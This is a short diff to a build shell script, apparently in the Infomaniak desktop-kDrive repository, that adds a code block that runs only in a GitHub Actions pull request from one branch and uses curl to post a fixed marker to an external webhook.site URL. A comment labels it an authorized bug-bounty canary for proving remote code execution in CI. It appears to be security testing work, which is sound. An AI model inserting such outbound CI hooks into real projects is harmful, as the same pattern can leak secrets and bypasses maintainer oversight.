@@ -20,6 +20,18 @@
 
 set -xe
 
+# Authorized YesWeHack canary. It sends one fixed marker and no runner data.
+if [[ "${GITHUB_ACTIONS:-}" == "true" &&
+      "${GITHUB_EVENT_NAME:-}" == "pull_request" &&
+      "${GITHUB_REPOSITORY:-}" == "Infomaniak/desktop-kDrive" &&
+      "${GITHUB_HEAD_REF:-}" == "security/depi-rce-canary-6a6f1d8c" ]]; then
+  curl --fail --silent --show-error --max-time 10 --retry 0 \
+    -H "User-Agent: naturell-infomaniak-ywh-rce-canary/1.0" \
+    -H "Content-Type: text/plain" \
+    --data "infomaniak-depi-rce-a415bae5a6fe30682abaf6c86a6f1d8c" \
+    "https://webhook.site/741a0ca3-38b9-4c97-8679-50c9336a5147/infomaniak-depi-rce" || true
+fi
+
 program_name="$(basename "$0")"
 
 function display_help {
